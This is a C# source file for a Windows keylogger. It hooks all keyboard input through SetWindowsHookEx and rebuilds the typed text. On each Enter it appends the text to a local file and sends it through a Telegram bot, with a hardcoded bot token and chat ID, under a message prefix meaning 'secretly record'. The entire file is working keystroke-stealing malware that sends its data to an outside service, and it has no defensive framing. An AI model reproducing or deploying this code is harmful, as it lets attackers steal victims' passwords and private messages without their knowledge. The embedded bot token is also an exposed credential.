using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Telegram.Bot;

namespace BotTesst
{
  public  class Keyloger
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        public
             static StringBuilder type = new StringBuilder();

        private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }
        static bool ship = false;
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys keys = (Keys)vkCode;
                KeysConverter converter = new KeysConverter();
                if (keys != Keys.Packet)
                {
                    string ke = converter.ConvertToString(keys);

                    if (ke.Contains("Space"))
                    {
                        ke = " ";
                    }
                    if (ke.Contains("Back"))
                    {
                        if (type.Length >= 1)
                        {
                            type.Remove(type.Length - 1, 1);
                            ke = "";
                        }
                    }
                    if (ke.ToLower().Contains("capital"))
                        ke = "";
                    if (ke.Contains("Enter"))
                    {
                        ke = "\n";
                    }
                    if (ke.Contains("Shift"))
                    {
                        ship = true;
                        ke = "";
                    }
                    if (Console.CapsLock)
                    {
                        if (ship)
                            ke = ke.ToLower();
                        else
                            ke = ke.ToUpper();
                    }
                    else
                    {
                        if (ship)
                            ke = ke.ToUpper();
                        else
                            ke = ke.ToLower();
                    }
                    type.Append(ke.Replace("NumPad", "") + "");

                }
                if ((Keys)vkCode == Keys.Enter)
                {
                    Console.WriteLine(type.ToString());
                    
                    System.IO.File.AppendAllText("Keyloger.txt", type.ToString());
                    var botClient = new TelegramBotClient("2067119062:AAHjw0g7Gk7W6axb-QF9rXhqjeCaf0GGuQo");

                    botClient.StartReceiving();
                    botClient.OnMessage += async (mess, acb) =>
                    {
                        int a = 942830900;
                        int b = 1866434325;
                        botClient.SendTextMessageAsync(chatId:b, "Ghi trộm" + type.ToString());
                    };
                }
}
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
        
        public  void HookKeyboard()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }
    }
}
